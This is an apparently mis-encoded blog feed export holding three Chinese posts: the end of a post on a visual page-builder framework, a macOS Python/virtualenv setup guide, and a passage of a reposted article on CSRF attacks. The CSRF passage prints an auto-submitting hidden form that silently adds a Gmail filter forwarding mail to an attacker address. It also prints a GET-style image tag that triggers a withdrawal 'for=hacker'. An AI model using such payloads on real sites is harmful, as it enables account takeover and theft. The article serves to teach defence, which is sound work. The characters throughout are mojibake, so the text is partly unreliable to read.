Demoå¯è§†åŒ–ç¼–è¾‘ å¦‚åŠ¨å›¾æ‰€ç¤º, pipeline çš„å¯è§†åŒ–ç¼–è¾‘èƒ½åŠ›æœ‰: å¯è§†åŒ–ä¿®æ”¹é¡µé¢å…¨å±€é…ç½®, å¦‚ä¿®æ”¹é¡µé¢ä¸»é¢˜é¢œè‰². å¯è§†åŒ–ä¿®æ”¹é¡µé¢ç»„ä»¶å†…å®¹, å¦‚ä¿®æ”¹ç»„ä»¶çš„å›¾ç‰‡å’Œæ›¿æ¢ç»„ä»¶æ–‡æœ¬. å®æ—¶é¢„è§ˆé¡µé¢ç¼–è¾‘æ•ˆæœ, å³åˆ»è·å¾—æ­å»ºåçš„é¡µé¢. é¡µé¢æ”¯æŒç”¨æˆ·äº¤äº’. ç»„ä»¶ç¼–è¾‘ å¦‚åŠ¨å›¾æ‰€ç¤º, pipeline çš„ç»„ä»¶ç¼–è¾‘èƒ½åŠ›æœ‰: åŠ¨æ€å¢åˆ é¡µé¢ç»„ä»¶. å¯è§†åŒ–çš„ç»„ä»¶æ‹–æ‹½, æ‹–æ‹½ç»„ä»¶åº“ç»„ä»¶æ’å…¥åˆ°é¡µé¢ç»„ä»¶åˆ—è¡¨ä¸­. ç»„ä»¶å¯ä»¥åŒ…å«ä¸šåŠ¡é€»è¾‘(ç½‘ç»œè¯·æ±‚å’Œç”¨æˆ·äº¤äº’). æ”¯æŒçš„å‰ç«¯æ¡†æ¶Pipeline å®ç°äº†ç¼–è¾‘å™¨å’Œé¡µé¢å‰ç«¯æ¡†æ¶çš„åˆ†ç¦», å¯ä»¥æ”¯æŒä¸åŒçš„å‰ç«¯æ¡†æ¶. æ‰€è°“æ”¯æŒçš„å‰ç«¯æ¡†æ¶, å°±æ˜¯å¯¹æŸä¸ªå‰ç«¯æ¡†æ¶æŒ‰ç…§ pipeline çš„çº¦æŸè§„åˆ™è¿›è¡Œç»„ä»¶ç¼–è¾‘æ–¹å¼å’Œå·¥ç¨‹æ„å»ºæ–¹å¼çš„æ”¹é€ , ä½¿å¾—å‰ç«¯æ¡†æ¶é¡µé¢å¯ä»¥åœ¨ pipeline ä¸­å¯è§†åŒ–æ­å»º. ç›®å‰å·²ç»æ”¯æŒ Vue, React, å’Œ Omi, ç†è®ºä¸Šå¯ä»¥æ”¯æŒä»»æ„å‰ç«¯æ¡†æ¶. æ¡†æ¶ç‰¹ç‚¹ å¼€æºé¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶. è‡ªå®šä¹‰é¡µé¢å¯é…ç½®å­—æ®µ. ç»„ä»¶åŠ¨æ€å¢å‡, ç»„ä»¶æ‹–æ‹½. ä»é¡µé¢æ¨¡æ¿å¿«é€Ÿç”Ÿæˆä¸šåŠ¡é¡µé¢. æ¨¡æ¿å·¥ç¨‹/ç¼–è¾‘å™¨/åå°æœåŠ¡è§£å¶. æ¨¡æ¿å·¥ç¨‹å‰ç«¯æ¡†æ¶æ— å…³: æ”¯æŒ vue å’Œ react ç­‰. æ”¯æŒè‡ªç”±æ‹“å±•é¡µé¢ç»„ä»¶, ä¸é™åˆ¶ç»„ä»¶æ ·å¼å¸ƒå±€, æ¥å£è°ƒç”¨ç­‰. å‰ç«¯å·¥ç¨‹çº¦æŸå°‘, ä¸é™åˆ¶ä½¿ç”¨å…¶ä»–æŠ€æœ¯(Redux, SSR, UIåº“ç­‰). ä¸äº‘å‡¤è¶çš„å¯¹æ¯”é˜¿é‡Œäº‘å‡¤è¶ æ˜¯ç›®å‰å¸‚åœºä¸Šå¯è§ä¸­æœ€æ£’çš„é¡µé¢å¯è§†åŒ–æ­å»ºæœåŠ¡, pipeline çš„å¾ˆå¤šæ–¹é¢å’Œäº‘å‡¤è¶ç›¸ä¼¼, åšä¸ªç®€å•å¯¹æ¯”: äº‘å‡¤è¶ pipeline å•†ä¸šåŒ–è§£å†³æ–¹æ¡ˆ, ç›´æ¥å¯ç”¨ å¼€æºç³»ç»Ÿ, åŸºç¡€çš„é¡µé¢æ­å»ºæ¡†æ¶, éœ€è¦è‡ªè¡Œéƒ¨ç½² ç”Ÿæˆçš„é¡µé¢, ä¸Šä¼ çš„å›¾ç‰‡ç­‰åªèƒ½æ‰˜ç®¡åœ¨é˜¿é‡Œ, ä¹Ÿé™å®šåŸŸå èµ„æºè½åœ°å’Œå‘¨è¾¹åŠŸèƒ½éœ€è¦è‡ªè¡Œæ­å»º, ä½†æ˜¯å¯ä»¥100%æŒæ§æ‰€æœ‰èµ„æº é…ç½®è¡¨å•åŠŸèƒ½æ¯”è¾ƒå®Œå–„ é…ç½®è¡¨å•æ¯”è¾ƒåŸºç¡€, éœ€è¦æå‡ ä½¿ç”¨è‡ªå®šä¹‰çš„ç»„ä»¶é…ç½®çº¦æŸè§„åˆ™ ä½¿ç”¨é€šç”¨çš„ JSON Schema è§„èŒƒ æ¨¡æ¿å‰ç«¯æ¡†æ¶é‡‡ç”¨ Nunjucks å‰ç«¯æ¡†æ¶é‡‡ç”¨æ²¡æœ‰çº¦æŸ, å·²ç»æ”¯æŒ vue å’Œ react ç­‰, ä¸šåŠ¡è¿ç§»æˆæœ¬ä½ éšè—äº†æ¨¡æ¿çš„æ„å»ºå¤„ç†è¿‡ç¨‹, æä¾›åˆ¶å®šçš„ IDE é‡‡ç”¨ webpack æ„å»º, æ¨¡æ¿å¼€å‘ä¸æ­£å¸¸å‰ç«¯é¡¹ç›®å¼€å‘ä¸€è‡´ ä¸æ”¯æŒè‡ªå®šä¹‰é¡µé¢çº§åˆ«çš„é…ç½®é¡¹ æ”¯æŒè‡ªå®šä¹‰é¡µé¢çº§åˆ«çš„é…ç½®é¡¹ æ€»çš„æ¥è¯´: äº‘å‡¤è¶æ˜¯å®Œæ•´çš„å•†ä¸šåŒ–é¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿ, é€‚åˆåä¸šåŠ¡è¿è¥çš„å…¬å¸; pipeline æ˜¯å¼€æºçš„é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶, é€‚åˆéœ€è¦è‡ªå»ºé¡µé¢å¯è§†åŒ–æ­å»ºç³»ç»Ÿä¸”æœ‰æŠ€æœ¯äººå‘˜æ”¯æŒçš„å…¬å¸. ä¸‹ä¸€æ­¥å·¥ä½œ å®Œå–„æŠ€æœ¯å®ç°æ–‡æ¡£, ä½¿ç”¨æ–‡æ¡£, ç³»ç»Ÿéƒ¨ç½²æ–‡æ¡£å’Œæ¨¡æ¿å¼€å‘æ–‡æ¡£. æä¾›å¯¹æ›´å¤šå‰ç«¯æ¡†æ¶çš„æ”¯æŒ. æä¾›æ›´åŠ ä¸°å¯Œçš„å¯è§†åŒ–äº¤äº’æ–¹å¼. æ€»ç»“æœ¬æ–‡è®¨è®ºäº†æ´»åŠ¨é¡µé¢å¼€å‘çš„ç—›ç‚¹, æ€»ç»“å‡ºé¡µå¯è§†åŒ–æ­å»ºå·¥å…·çš„7ä¸ªæŠ€æœ¯è¦ç‚¹å’Œ4ä¸ªæŠ€æœ¯éš¾ç‚¹, å¹¶æ•´ç†å‡ºç†æƒ³çš„è¿è¥é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·, æœ€åä»‹ç»é¡µé¢å¯è§†åŒ–æ­å»ºæ¡†æ¶ pipeline. è¡Œæ–‡ä»“ä¿ƒ, å¯¹é¡µé¢å¯è§†åŒ–æ­å»ºè¯é¢˜æˆ–å¼€æºé¡¹ç›® pipeline æ„Ÿå…´è¶£, æ¬¢è¿è®¨è®º. References pipeline github.com/page-pipeplâ€¦ é¡µé¢å¯è§†åŒ–æ­å»ºå·¥å…·å‰ç”Ÿä»Šä¸– github.com/CntChen/cntâ€¦ /15 Vue 2.0å­¦ä¹ ç¬”è®°ï¼šç»„ä»¶æ•°æ®ä¼ é€’ www.w3cplus.com/vue/componeâ€¦ é˜¿é‡Œäº‘å‡¤è¶ i.yunfengdie.com/]]></content>
      <categories>
        <category>Webå‰ç«¯</category>
      </categories>
      <tags>
        <tag>Webå‰ç«¯</tag>
      </tags>
  </entry>
  <entry>
    <title></title>
    <url>%2F2019%2F09%2F16%2FPython%2FMacOS%20%E6%90%AD%E5%BB%BA%20Python%20%E7%8E%AF%E5%A2%83%2F</url>
    <content type="text"><![CDATA[MacOS æ­å»º Python ç¯å¢ƒå®‰è£… Python31brew install python3 12Warning: python 3.7.4 is already installed, it&apos;s just not linkedYou can use `brew link python` to link this version. 1brew link python 1Linking /usr/local/Cellar/python/3.7.4... Error:Permission denied @ dir_s_mkdir - /usr/local/Frameworks ç›¸åº”çš„è·¯å¾„ä¸‹åˆ›å»ºç›®å½•,å¹¶èµ‹äºˆç›¸åº”çš„æƒé™: 12sudo mkdir /usr/local/Frameworkssudo chown $(whoami):admin /usr/local/Frameworks åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¯ä»¥ç”¨å¦‚ä¸‹å‘½ä»¤æ¥æ£€æŸ¥æˆ‘ä»¬Pythonæ˜¯å¦æœ‰å®‰è£…æˆåŠŸã€‚ 1python3 --version Python3 å’Œ Python2 çš„åŒºåˆ«Python3 é»˜è®¤ä½¿ç”¨ utf-8ï¼Œåœ¨å¤„ç†ä¸­æ–‡çš„æ—¶å€™å¯ä»¥ å‡å°‘å¾ˆå¤šç¼–è§£ç çš„é—®é¢˜ï¼Œè€Œ Python2 é»˜è®¤ä½¿ç”¨asciiï¼›å®˜æ–¹å®£å¸ƒ Python2 çš„æ”¯æŒå°†äº 2020 å¹´ 1 æœˆåœæ­¢ç»´æŠ¤ã€‚ å…·ä½“åŒºåˆ«å‚è€ƒå®˜æ–¹æ–‡æ¡£è¯´æ˜ï¼šShould I use Python 2 or Python 3 for my development activity?ã€‚ å®‰è£… pip3ç›´æ¥ sudo easy_install pip3 ä¼šæŠ¥é”™ï¼š 12345678910sudo easy_install pip3Password:Searching for pip3Reading https://pypi.python.org/simple/pip3/Couldn&apos;t find index page for &apos;pip3&apos; (maybe misspelled?)Scanning index of all packages (this may take a while)Reading https://pypi.python.org/simple/No local packages or download links found for pip3error: Could not find suitable distribution for Requirement.parse(&apos;pip3&apos;) å®‰è£… Python3 æ—¶å…¶å®ä¼šè‡ªåŠ¨å®‰è£… pip3ï¼Œæ“ä½œå¦‚ä¸‹ï¼š 12brew install python3brew postinstall python3 å®‰è£…è™šæ‹Ÿç¯å¢ƒ åœ¨å¼€å‘ Python åº”ç”¨ç¨‹åºçš„æ—¶å€™ï¼Œç³»ç»Ÿå®‰è£…çš„ Python3 åªæœ‰ä¸€ä¸ªç‰ˆæœ¬ï¼Œæ¯”å¦‚ 3.7.4ï¼Œæ‰€æœ‰ç¬¬ä¸‰æ–¹çš„åŒ…éƒ½ä¼šè¢« pip å®‰è£…åˆ° Python3 çš„ site-packages ç›®å½•ä¸‹ã€‚ å¦‚æœæˆ‘ä»¬è¦åŒæ—¶å¼€å‘å¤šä¸ªåº”ç”¨ç¨‹åºï¼Œé‚£è¿™äº›åº”ç”¨ç¨‹åºéƒ½ä¼šå…±ç”¨ä¸€ä¸ª Pythonï¼Œå°±æ˜¯å®‰è£…åœ¨ç³»ç»Ÿçš„Python 3ã€‚å¦‚æœåº”ç”¨ A éœ€è¦ jinja 2.7ï¼Œè€Œåº”ç”¨ B éœ€è¦ jinja 2.6 æ€ä¹ˆåŠï¼Ÿ è¿™ç§æƒ…å†µä¸‹ï¼Œæ¯ä¸ªåº”ç”¨å¯èƒ½éœ€è¦å„è‡ªæ‹¥æœ‰ä¸€å¥—â€œç‹¬ç«‹â€çš„ Python è¿è¡Œç¯å¢ƒã€‚virtualenv å°±æ˜¯ç”¨æ¥ä¸ºä¸€ä¸ªåº”ç”¨åˆ›å»ºä¸€å¥—â€œéš”ç¦»â€çš„ Python è¿è¡Œç¯å¢ƒã€‚ å®‰è£… virtualenv 1sudo pip3 install virtualenv å®‰è£…virtualenvwrapper virtaulenvwrapperæ˜¯virtualenvçš„æ‰©å±•åŒ…ï¼Œå¯ä»¥æ›´æ–¹ä¾¿åœ°æ–°å¢ï¼Œåˆ é™¤ï¼Œå¤åˆ¶ï¼Œåˆ‡æ¢è™šæ‹Ÿç¯å¢ƒã€‚ 1sudo pip3 install virtualenvwrapper åˆ›å»ºæ–‡ä»¶å¤¹workspaceså­˜æ”¾è™šæ‹Ÿç¯å¢ƒ 12mkdir ~/workspacescd ~/workspaces æ‰“å¼€ç»ˆç«¯shellé…ç½®æ–‡ä»¶å†™å…¥é…ç½®è·¯å¾„ 1open ~/.zshrc è¿½åŠ  12345# è®¾ç½®virtualenvwrapperexport WORKON_HOME=~/workspacesexport VIRTUALENVWRAPPER_PYTHON=/usr/local/bin/python3# æ‰“å¼€ç»ˆç«¯è‡ªåŠ¨å¯ç”¨source /usr/local/bin/virtualenvwrapper.sh ç¼–è¯‘ 1source ~/.zshrc åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ 1mkvirtualenv test --python=python3 lsvirtualenv æŸ¥çœ‹æ‰€æœ‰è™šæ‹Ÿç¯å¢ƒ workon åœ¨é¡¹ç›®åº•ä¸‹æ¿€æ´»è™šæ‹Ÿç¯å¢ƒ 1workon test deactivate é€€å‡ºç¯å¢ƒ rmvirtualenv åˆ é™¤ç¯å¢ƒ 1rmvirtualenv test æ›´å¤šæŒ‡ä»¤å¯ä»¥åœ¨ shell ä¸­è¾“å…¥ virtualenv å›è½¦ä¼šæœ‰æç¤º virtualenv åŸç†virtualenv æ˜¯å¦‚ä½•åˆ›å»ºâ€œç‹¬ç«‹â€çš„ Python è¿è¡Œç¯å¢ƒçš„å‘¢ï¼ŸåŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯æŠŠç³»ç»Ÿ Python å¤åˆ¶ä¸€ä»½åˆ°virtualenv çš„ç¯å¢ƒï¼Œç”¨å‘½ä»¤ source venv/bin/activate è¿›å…¥ä¸€ä¸ª virtualenv ç¯å¢ƒæ—¶ï¼Œvirtualenv ä¼šä¿®æ”¹ç›¸å…³ç¯å¢ƒå˜é‡ï¼Œè®©å‘½ä»¤ python å’Œ pip å‡æŒ‡å‘å½“å‰çš„ virtualenv ç¯å¢ƒã€‚ AnacondaAnaconda ï¼ˆå·¨èŸ’ï¼‰æ˜¯ Python çš„ä¸€ä¸ªå‘è¡Œç‰ˆï¼Œå¦‚æœæŠŠ Python æ¯”ä½œ Linuxï¼Œé‚£ä¹ˆ Anancoda å°±æ˜¯ CentOS æˆ–è€… Ubuntuã€‚å®ƒè§£å†³äº†Pythonå¼€å‘è€…çš„ä¸¤å¤§ç—›ç‚¹ã€‚ ç¬¬ä¸€ï¼šæä¾›åŒ…ç®¡ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼äº pipï¼ŒWindows å¹³å°å®‰è£…ç¬¬ä¸‰æ–¹åŒ…ç»å¸¸å¤±è´¥çš„åœºæ™¯å¾—ä»¥è§£å†³ã€‚ ç¬¬äºŒï¼šæä¾›è™šæ‹Ÿç¯å¢ƒç®¡ç†ï¼ŒåŠŸèƒ½ç±»ä¼¼äº virtualenvï¼Œè§£å†³äº†å¤šç‰ˆæœ¬ Python å¹¶å­˜é—®é¢˜ã€‚ å…·ä½“å®‰è£…å‚è€ƒ å®Œç¾è§£å†³ Python2 å’Œ python3 å…±å­˜é—®é¢˜çš„Anaconda å®‰è£… mysql æ‰“å¼€ mysql å®˜ç½‘ ç‚¹å‡»ä¸‹æ–¹çš„ DOWNLOADS : MySQL Community Server ï¼Œå®‰è£…ã€‚ æ‰“å¼€ zshrc è¿½åŠ ç¯å¢ƒå˜é‡ 1PATH=$PATH:/usr/local/mysql/bin å‚è€ƒæ–‡ç«  virtualenv pip]]></content>
  </entry>
  <entry>
    <title><![CDATA[å‰ç«¯å®‰å…¨ç³»åˆ—ï¼ˆäºŒï¼‰ï¼šå¦‚ä½•é˜²æ­¢CSRFæ”»å‡»ï¼Ÿ]]></title>
    <url>%2F2019%2F09%2F08%2FWeb%E5%89%8D%E7%AB%AF%2F%E5%89%8D%E7%AB%AF%E5%AE%89%E5%85%A8%E7%B3%BB%E5%88%97%EF%BC%88%E4%BA%8C%EF%BC%89%EF%BC%9A%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2CSRF%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªç¾å›¢æŠ€æœ¯å›¢é˜Ÿï¼Œä½œè€…åˆ˜çƒ¨ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://tech.meituan.com/2018/10/11/fe-security-csrf.html èƒŒæ™¯éšç€äº’è”ç½‘çš„é«˜é€Ÿå‘å±•ï¼Œä¿¡æ¯å®‰å…¨é—®é¢˜å·²ç»æˆä¸ºä¼ä¸šæœ€ä¸ºå…³æ³¨çš„ç„¦ç‚¹ä¹‹ä¸€ï¼Œè€Œå‰ç«¯åˆæ˜¯å¼•å‘ä¼ä¸šå®‰å…¨é—®é¢˜çš„é«˜å±æ®ç‚¹ã€‚åœ¨ç§»åŠ¨äº’è”ç½‘æ—¶ä»£ï¼Œå‰ç«¯äººå‘˜é™¤äº†ä¼ ç»Ÿçš„ XSSã€CSRF ç­‰å®‰å…¨é—®é¢˜ä¹‹å¤–ï¼Œåˆæ—¶å¸¸é­é‡ç½‘ç»œåŠ«æŒã€éæ³•è°ƒç”¨ Hybrid API ç­‰æ–°å‹å®‰å…¨é—®é¢˜ã€‚å½“ç„¶ï¼Œæµè§ˆå™¨è‡ªèº«ä¹Ÿåœ¨ä¸æ–­åœ¨è¿›åŒ–å’Œå‘å±•ï¼Œä¸æ–­å¼•å…¥ CSPã€Same-Site Cookies ç­‰æ–°æŠ€æœ¯æ¥å¢å¼ºå®‰å…¨æ€§ï¼Œä½†æ˜¯ä»å­˜åœ¨å¾ˆå¤šæ½œåœ¨çš„å¨èƒï¼Œè¿™éœ€è¦å‰ç«¯æŠ€æœ¯äººå‘˜ä¸æ–­è¿›è¡Œâ€œæŸ¥æ¼è¡¥ç¼ºâ€ã€‚ å‰ç«¯å®‰å…¨è¿‘å‡ å¹´ï¼Œç¾å›¢ä¸šåŠ¡é«˜é€Ÿå‘å±•ï¼Œå‰ç«¯éšä¹‹é¢ä¸´å¾ˆå¤šå®‰å…¨æŒ‘æˆ˜ï¼Œå› æ­¤ç§¯ç´¯äº†å¤§é‡çš„å®è·µç»éªŒã€‚æˆ‘ä»¬æ¢³ç†äº†å¸¸è§çš„å‰ç«¯å®‰å…¨é—®é¢˜ä»¥åŠå¯¹åº”çš„è§£å†³æ–¹æ¡ˆï¼Œå°†ä¼šåšæˆä¸€ä¸ªç³»åˆ—ï¼Œå¸Œæœ›å¯ä»¥å¸®åŠ©å‰ç«¯åŒå­¦åœ¨æ—¥å¸¸å¼€å‘ä¸­ä¸æ–­é¢„é˜²å’Œä¿®å¤å®‰å…¨æ¼æ´ã€‚æœ¬æ–‡æ˜¯è¯¥ç³»åˆ—çš„ç¬¬äºŒç¯‡ã€‚ ä»Šå¤©æˆ‘ä»¬è®²è§£ä¸€ä¸‹ CSRFï¼Œå…¶å®ç›¸æ¯”XSSï¼ŒCSRFçš„åæ°”ä¼¼ä¹å¹¶ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œå¾ˆå¤šäººéƒ½è®¤ä¸ºâ€œCSRFä¸å…·å¤‡é‚£ä¹ˆå¤§çš„ç ´åæ€§â€ã€‚çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿæ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¿˜æ˜¯æœ‰è¯·å°æ˜åŒå­¦å†æ¬¡â€œé—ªäº®â€ç™»åœºã€‚ CSRFæ”»å‡»CSRFæ¼æ´çš„å‘ç”Ÿç›¸æ¯”XSSï¼ŒCSRFçš„åæ°”ä¼¼ä¹å¹¶ä¸æ˜¯é‚£ä¹ˆå¤§ï¼Œå¾ˆå¤šäººéƒ½è®¤ä¸ºCSRFâ€œä¸é‚£ä¹ˆæœ‰ç ´åæ€§â€ã€‚çœŸçš„æ˜¯è¿™æ ·å—ï¼Ÿ æ¥ä¸‹æ¥æœ‰è¯·å°æ˜å‡ºåœº~~ å°æ˜çš„æ‚²æƒ¨é­é‡è¿™ä¸€å¤©ï¼Œå°æ˜åŒå­¦ç™¾æ— èŠèµ–åœ°åˆ·ç€Gmailé‚®ä»¶ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯æ²¡è¥å…»çš„é€šçŸ¥ã€éªŒè¯ç ã€èŠå¤©è®°å½•ä¹‹ç±»ã€‚ä½†æœ‰ä¸€å°é‚®ä»¶å¼•èµ·äº†å°æ˜çš„æ³¨æ„ï¼š ç”©å–æ¯”ç‰¹å¸ï¼Œä¸€ä¸ªåªè¦998ï¼ï¼ èªæ˜çš„å°æ˜å½“ç„¶çŸ¥é“è¿™ç§è‚¯å®šæ˜¯éª—å­ï¼Œä½†è¿˜æ˜¯æŠ±ç€å¥½å¥‡çš„æ€åº¦ç‚¹äº†è¿›å»ï¼ˆè¯·å‹¿æ¨¡ä»¿ï¼‰ã€‚æœç„¶ï¼Œè¿™åªæ˜¯ä¸€ä¸ªä»€ä¹ˆéƒ½æ²¡æœ‰çš„ç©ºç™½é¡µé¢ï¼Œå°æ˜å¤±æœ›çš„å…³é—­äº†é¡µé¢ã€‚ä¸€åˆ‡ä¼¼ä¹ä»€ä¹ˆéƒ½æ²¡æœ‰å‘ç”Ÿâ€¦â€¦ åœ¨è¿™å¹³é™çš„å¤–è¡¨ä¹‹ä¸‹ï¼Œé»‘å®¢çš„æ”»å‡»å·²ç„¶å¾—æ‰‹ã€‚å°æ˜çš„Gmailä¸­ï¼Œè¢«å·å·è®¾ç½®äº†ä¸€ä¸ªè¿‡æ»¤è§„åˆ™ï¼Œè¿™ä¸ªè§„åˆ™ä½¿å¾—æ‰€æœ‰çš„é‚®ä»¶éƒ½ä¼šè¢«è‡ªåŠ¨è½¬å‘åˆ°hacker@hackermail.comã€‚å°æ˜è¿˜åœ¨ç»§ç»­åˆ·ç€é‚®ä»¶ï¼Œæ®Šä¸çŸ¥ä»–çš„é‚®ä»¶æ­£åœ¨ä¸€å°å°åœ°ï¼Œå¦‚è„±ç¼°çš„é‡é©¬ä¸€èˆ¬åœ°ï¼ŒæŒç»­ä¸æ–­åœ°å‘ç€é»‘å®¢çš„é‚®ç®±è½¬å‘è€Œå»ã€‚ ä¸ä¹…ä¹‹åçš„ä¸€å¤©ï¼Œå°æ˜å‘ç°è‡ªå·±çš„åŸŸåå·²ç»è¢«è½¬è®©äº†ã€‚æ‡µæ‡‚çš„å°æ˜ä»¥ä¸ºæ˜¯åŸŸååˆ°æœŸè‡ªå·±å¿˜äº†ç»­è´¹ï¼Œç›´åˆ°æœ‰ä¸€å¤©ï¼Œå¯¹æ–¹å¼€å‡ºäº† $650 çš„èµå›ä»·ç ï¼Œå°æ˜æ‰å¼€å§‹è§‰å¾—ä¸å¤ªå¯¹åŠ²ã€‚ å°æ˜ä»”ç»†æŸ¥äº†ä¸‹åŸŸåçš„è½¬è®©ï¼Œå¯¹æ–¹æ˜¯æ‹¥æœ‰è‡ªå·±çš„éªŒè¯ç çš„ï¼Œè€ŒåŸŸåçš„éªŒè¯ç åªå­˜åœ¨äºè‡ªå·±çš„é‚®ç®±é‡Œé¢ã€‚å°æ˜å›æƒ³èµ·é‚£å¤©å¥‡æ€ªçš„é“¾æ¥ï¼Œæ‰“å¼€åé‡æ–°æŸ¥çœ‹äº†â€œç©ºç™½é¡µâ€çš„æºç ï¼š 12345678910&lt;form method=&quot;POST&quot; action=&quot;https://mail.google.com/mail/h/ewt1jmuj4ddv/?v=prf&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_emc&quot; value=&quot;true&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;cf2_email&quot; value=&quot;hacker@hakermail.com&quot;/&gt; ..... &lt;input type=&quot;hidden&quot; name=&quot;irf&quot; value=&quot;on&quot;/&gt; &lt;input type=&quot;hidden&quot; name=&quot;nvp_bu_cftb&quot; value=&quot;Create Filter&quot;/&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit();&lt;/script&gt; è¿™ä¸ªé¡µé¢åªè¦æ‰“å¼€ï¼Œå°±ä¼šå‘Gmailå‘é€ä¸€ä¸ªpostè¯·æ±‚ã€‚è¯·æ±‚ä¸­ï¼Œæ‰§è¡Œäº†â€œCreate Filterâ€å‘½ä»¤ï¼Œå°†æ‰€æœ‰çš„é‚®ä»¶ï¼Œè½¬å‘åˆ°â€œhacker@hackermail.comâ€ã€‚ å°æ˜ç”±äºåˆšåˆšå°±ç™»é™†äº†Gmailï¼Œæ‰€ä»¥è¿™ä¸ªè¯·æ±‚å‘é€æ—¶ï¼Œæºå¸¦ç€å°æ˜çš„ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ï¼ŒGmailçš„åå°æ¥æ”¶åˆ°è¯·æ±‚ï¼ŒéªŒè¯äº†ç¡®å®æœ‰å°æ˜çš„ç™»å½•å‡­è¯ï¼Œäºæ˜¯æˆåŠŸç»™å°æ˜é…ç½®äº†è¿‡æ»¤å™¨ã€‚ é»‘å®¢å¯ä»¥æŸ¥çœ‹å°æ˜çš„æ‰€æœ‰é‚®ä»¶ï¼ŒåŒ…æ‹¬é‚®ä»¶é‡Œçš„åŸŸåéªŒè¯ç ç­‰éšç§ä¿¡æ¯ã€‚æ‹¿åˆ°éªŒè¯ç ä¹‹åï¼Œé»‘å®¢å°±å¯ä»¥è¦æ±‚åŸŸåæœåŠ¡å•†æŠŠåŸŸåé‡ç½®ç»™è‡ªå·±ã€‚ å°æ˜å¾ˆå¿«æ‰“å¼€Gmailï¼Œæ‰¾åˆ°äº†é‚£æ¡è¿‡æ»¤å™¨ï¼Œå°†å…¶åˆ é™¤ã€‚ç„¶è€Œï¼Œå·²ç»æ³„éœ²çš„é‚®ä»¶ï¼Œå·²ç»è¢«è½¬è®©çš„åŸŸåï¼Œå†ä¹Ÿæ— æ³•æŒ½å›äº†â€¦â€¦ ä»¥ä¸Šå°±æ˜¯å°æ˜çš„æ‚²æƒ¨é­é‡ã€‚è€Œâ€œç‚¹å¼€ä¸€ä¸ªé»‘å®¢çš„é“¾æ¥ï¼Œæ‰€æœ‰é‚®ä»¶éƒ½è¢«çªƒå–â€è¿™ç§äº‹æƒ…å¹¶ä¸æ˜¯æœæ’°çš„ï¼Œæ­¤äº‹ä»¶åŸå‹æ˜¯2007å¹´Gmailçš„CSRFæ¼æ´ï¼š https://www.davidairey.com/google-Gmail-security-hijack/ å½“ç„¶ï¼Œç›®å‰æ­¤æ¼æ´å·²è¢«Gmailä¿®å¤ï¼Œè¯·ä½¿ç”¨Gmailçš„åŒå­¦ä¸è¦æ…Œå¼ ã€‚ ä»€ä¹ˆæ˜¯CSRFCSRFï¼ˆCross-site request forgeryï¼‰è·¨ç«™è¯·æ±‚ä¼ªé€ ï¼šæ”»å‡»è€…è¯±å¯¼å—å®³è€…è¿›å…¥ç¬¬ä¸‰æ–¹ç½‘ç«™ï¼Œåœ¨ç¬¬ä¸‰æ–¹ç½‘ç«™ä¸­ï¼Œå‘è¢«æ”»å‡»ç½‘ç«™å‘é€è·¨ç«™è¯·æ±‚ã€‚åˆ©ç”¨å—å®³è€…åœ¨è¢«æ”»å‡»ç½‘ç«™å·²ç»è·å–çš„æ³¨å†Œå‡­è¯ï¼Œç»•è¿‡åå°çš„ç”¨æˆ·éªŒè¯ï¼Œè¾¾åˆ°å†’å……ç”¨æˆ·å¯¹è¢«æ”»å‡»çš„ç½‘ç«™æ‰§è¡ŒæŸé¡¹æ“ä½œçš„ç›®çš„ã€‚ ä¸€ä¸ªå…¸å‹çš„CSRFæ”»å‡»æœ‰ç€å¦‚ä¸‹çš„æµç¨‹ï¼š å—å®³è€…ç™»å½•a.comï¼Œå¹¶ä¿ç•™äº†ç™»å½•å‡­è¯ï¼ˆCookieï¼‰ã€‚ æ”»å‡»è€…å¼•è¯±å—å®³è€…è®¿é—®äº†b.comã€‚ b.com å‘ a.com å‘é€äº†ä¸€ä¸ªè¯·æ±‚ï¼ša.com/act=xxã€‚æµè§ˆå™¨ä¼šé»˜è®¤æºå¸¦a.comçš„Cookieã€‚ a.comæ¥æ”¶åˆ°è¯·æ±‚åï¼Œå¯¹è¯·æ±‚è¿›è¡ŒéªŒè¯ï¼Œå¹¶ç¡®è®¤æ˜¯å—å®³è€…çš„å‡­è¯ï¼Œè¯¯ä»¥ä¸ºæ˜¯å—å®³è€…è‡ªå·±å‘é€çš„è¯·æ±‚ã€‚ a.comä»¥å—å®³è€…çš„åä¹‰æ‰§è¡Œäº†act=xxã€‚ æ”»å‡»å®Œæˆï¼Œæ”»å‡»è€…åœ¨å—å®³è€…ä¸çŸ¥æƒ…çš„æƒ…å†µä¸‹ï¼Œå†’å……å—å®³è€…ï¼Œè®©a.comæ‰§è¡Œäº†è‡ªå·±å®šä¹‰çš„æ“ä½œã€‚ å‡ ç§å¸¸è§çš„æ”»å‡»ç±»å‹GETç±»å‹çš„CSRF GETç±»å‹çš„CSRFåˆ©ç”¨éå¸¸ç®€å•ï¼Œåªéœ€è¦ä¸€ä¸ªHTTPè¯·æ±‚ï¼Œä¸€èˆ¬ä¼šè¿™æ ·åˆ©ç”¨ï¼š 1![](https://awps-assets.meituan.net/mit-x/blog-images-bundle-2018b/ff0cdbee.example/withdraw?amount=10000&amp;for=hacker) 